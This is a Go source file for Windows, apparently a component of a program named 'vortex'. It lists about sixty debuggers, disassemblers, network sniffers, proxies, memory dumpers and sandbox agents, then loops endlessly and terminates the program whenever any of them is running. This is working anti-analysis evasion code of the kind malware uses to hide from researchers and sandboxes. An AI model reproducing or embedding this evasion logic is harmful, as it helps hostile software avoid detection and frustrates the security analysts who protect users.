//go:build windows

package envtype

import (
	"os"
	"vortex/hutil"
	"time"
)

func chkRunningProcs() (bool, error) {
	procList := []string{
		"ollydbg", "immunitydebugger", "autorunsc",
		"tcpview", "autoruns", "processhacker",
		"filemon", "procmon", "regmon", "idaq",
		"idaq64", "wireshark", "tshark", "tcpdump",
		"dumpcap", "hookexplorer", "lordpe", "petools",
		"x32dbg", "x64dbg", "fiddler", "BurpSuite",
		"BurpSuiteFree", "Charles", "httpsMon",
		"httpwatchstudiox64", "mitmdump", "mitmweb",
		"NetworkMiner", "Proxifier", "rpcapd", "smsniff",
		"WinDump", "WSockExpert", "x96dbg", "ida64",
		"idag", "idag64", "idaw", "idaw64", "idau",
		"idau64", "scylla_x64", "scylla_x86", "protection_id",
		"windbg", "reshacker", "ImportREC", "HTTPDebuggerUI",
		"HTTPDebuggerSvc", "Debugger", "ida", "scylla",
		"disassembly", "reconstructor", "MegaDumper",
		"KsDumper", "joeboxcontrol", "ksdumperclient",
		"prl_cc", "prl_tools", "joeer", "pestudio",
	}

	for _, p := range procList {
		procId, err := hutil.GetProcessIdByName(p)
		if err != nil {
			return false, err
		}
		if procId != 0 {
			return true, err
		}
	}
	time.Sleep(2 * time.Second)

	return false, nil
}

// Exit if analysis softwares are running
func Protector() error {
	for {
		analyticsProc, err := chkRunningProcs()
		if err != nil {
			return err
		}

		if analyticsProc {
			os.Exit(500)
		}
	}
}
